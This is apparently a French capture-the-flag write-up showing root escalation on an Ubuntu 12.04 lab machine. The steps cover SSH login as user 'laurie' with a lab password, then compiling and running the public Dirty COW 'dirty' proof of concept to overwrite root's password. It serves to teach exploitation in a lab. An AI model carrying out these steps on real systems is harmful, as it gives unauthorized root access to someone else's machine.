# Dirty Cow

On se connecte en ssh sur le user Laurie : `ssh laurie@<ip>`
Password : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

De là, on regarde la version de l'OS utilisée avec `cat /etc/os-release`

```
NAME="Ubuntu"
VERSION="12.04.5 LTS, Precise Pangolin"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
VERSION_ID="12.04"
```

De là, on recherche des failles pour exploiter cette version d'Ubuntu. 
On trouve notamment une faille tres connue appelée Dirty Cow, que l'on décider d'essayer. Sur un github Dirty Cow on trouve plusieurs fichiers permettant d'exploiter la faille de différentes manières : `https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs`

Une des premières failles à fonctionne est la 'dirty', permettant de réécrire le user 'root' avec un mot de passe que l'on aura déterminé. 
On execute alors les actions suivantes : 
- Copie du fichier 'dirty' sur la session de Laurie (voir `writeup3-dirty.c`)
- `gcc -pthread dirty.c -o dirty -lcrypt`
- `./dirty`. On nous demande alors un mot de passe. On renseigne par exemple `test`. Le script peut prendre un peu de temps à d'executer.
- `su root` puis renseigner le mot de passe choisi (ici `test`)
- `id` : `uid=0(root) gid=0(root) groups=0(root)`

On est root ! 🎉
